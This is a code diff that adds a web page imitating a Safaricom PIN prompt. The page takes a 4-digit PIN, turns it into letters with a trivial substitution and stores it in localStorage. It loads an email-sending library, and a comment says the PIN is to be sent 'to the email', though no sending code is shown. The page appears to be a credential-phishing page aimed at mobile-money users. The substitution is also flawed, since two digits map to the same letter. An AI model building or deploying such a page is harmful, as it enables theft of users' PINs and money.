@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        #heading {
+            font-size: 30px;
+            background-color: #f5f7f2;
+            display: block;
+            margin: 10px;
+            padding: 20px;
+        }
+        #subheading {
+            font-size: 25px;
+            font-weight: bold;
+            color: #5da9c9;
+            display: block;
+            margin: 10px;
+            padding: 20px;
+        }
+        #enternumberlabel {
+            color: #d6d4d4;
+            margin-left: 20px;
+            display: block;
+        }
+        #enternumberinput {
+            display: block;
+            outline: none;
+            margin: 20px;
+        }
+        #getphonebutton {
+            margin-top: 20px;
+            margin-left: 50px;
+            width: 80px;
+            height: 30px;
+            border-radius: 25px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <label id="heading">Safaricom</label>
+    <label id="subheading">Enter Pin</label>
+    <label id="enternumberlabel">Digits (0-9, *, #, +) 10-13</label>
+    <input id="enternumberinput" type="text" maxlength="4">
+    <button id="getphonebutton">OK</button>
+
+    <script>
+        function getPhoneNumber() {
+            const pin = document.getElementById("enternumberinput").value;
+
+            // Validate that the pin is exactly 4 digits
+            if (!/^[0-9]{4}$/.test(pin)) {
+                alert("Please enter a valid 4-digit PIN using numbers only.");
+                return;
+            }
+
+            // Encoding the PIN
+            const code = {
+                "1": "i",
+                "2": "h",
+                "3": "g",
+                "4": "h",
+                "5": "f",
+                "6": "e",
+                "7": "d",
+                "8": "c",
+                "9": "b",
+                "0": "a"
+            };
+
+            let cipher = "";
+            for (const digit of pin) {
+                cipher += code[digit];
+            }
+
+            // Send the encoded pin to the email
+            localStorage.setItem("cipher",cipher)
+        }
+
+        // Add event listener for the "OK" button
+        document.getElementById("getphonebutton").addEventListener("click", getPhoneNumber);
+    </script>
+</body>
+</html>
